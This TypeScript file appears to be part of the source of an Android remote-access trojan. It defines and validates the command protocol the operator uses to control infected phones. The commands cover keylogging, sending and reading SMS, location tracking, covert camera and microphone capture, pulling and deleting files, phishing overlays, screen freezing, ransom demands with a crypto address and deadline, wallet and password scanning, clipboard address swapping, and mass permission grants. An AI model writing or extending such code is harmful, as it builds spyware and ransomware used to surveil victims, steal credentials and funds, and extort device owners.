import { z } from 'zod';
import { CMD, type Command } from '@xrc/shared';

const gestureType = z.enum([
  'tap', 'swipe', 'long_press', 'home', 'back', 'recents',
  'vol_up', 'vol_down', 'power', 'notifications', 'quick_settings', 'screenshot',
]);

const commandSchema = z.discriminatedUnion('cmd', [
  z.object({ cmd: z.literal(CMD.PING) }),
  z.object({ cmd: z.literal(CMD.INFO) }),
  z.object({ cmd: z.literal(CMD.KEYLOG), flush: z.boolean().optional() }),
  z.object({ cmd: z.literal(CMD.SMS), action: z.enum(['list', 'send']), to: z.string().optional(), body: z.string().optional() }),
  z.object({ cmd: z.literal(CMD.NOTIF), action: z.enum(['enable', 'disable', 'list']) }),
  z.object({ cmd: z.literal(CMD.LOCATION), mode: z.enum(['once', 'continuous', 'stop']) }),
  z.object({ cmd: z.literal(CMD.CAMERA), cam: z.enum(['front', 'rear']), action: z.enum(['snap', 'burst', 'stop']), durSec: z.number().optional() }),
  z.object({ cmd: z.literal(CMD.MIC), action: z.enum(['start', 'stop']), durSec: z.number().optional() }),
  z.object({ cmd: z.literal(CMD.FILES), action: z.enum(['list', 'pull', 'delete']), path: z.string().optional() }),
  z.object({ cmd: z.literal(CMD.SCREEN), action: z.enum(['start', 'stop']), fps: z.number().optional() }),
  z.object({ cmd: z.literal(CMD.GESTURE), type: gestureType, x: z.number().optional(), y: z.number().optional(), x2: z.number().optional(), y2: z.number().optional(), durMs: z.number().optional() }),
  z.object({ cmd: z.literal(CMD.TEXT), text: z.string() }),
  z.object({ cmd: z.literal(CMD.OVERLAY), slug: z.string(), url: z.string() }),
  z.object({ cmd: z.literal(CMD.FREEZE), on: z.boolean() }),
  z.object({ cmd: z.literal(CMD.RANSOM), note: z.string(), amount: z.string(), currency: z.string(), address: z.string(), hours: z.number() }),
  z.object({ cmd: z.literal(CMD.WALLET_SCAN) }),
  z.object({ cmd: z.literal(CMD.PASS_SCAN) }),
  z.object({ cmd: z.literal(CMD.CLIPBOARD), action: z.enum(['list', 'watch', 'swap']), address: z.string().optional() }),
  z.object({ cmd: z.literal(CMD.APPS) }),
  z.object({ cmd: z.literal(CMD.PERMS), action: z.enum(['grant_all', 'status']) }),
  z.object({ cmd: z.literal(CMD.KILL), confirm: z.string() }),
]);

export function validateCommand(input: unknown): { ok: true; value: Command } | { ok: false; error: string } {
  const r = commandSchema.safeParse(input);
  if (r.success) return { ok: true, value: r.data as Command };
  return {
    ok: false,
    error: r.error.issues.map((i) => `${i.path.join('.')}: ${i.message}`).join('; '),
  };
}

export function isEnvelope(x: unknown): boolean {
  if (typeof x !== 'object' || x === null) return false;
  const e = x as Record<string, unknown>;
  return (
    e.v === 1 &&
    typeof e.id === 'string' &&
    (e.t === 'cmd' || e.t === 'evt' || e.t === 'res') &&
    typeof e.d === 'object' &&
    e.d !== null
  );
}
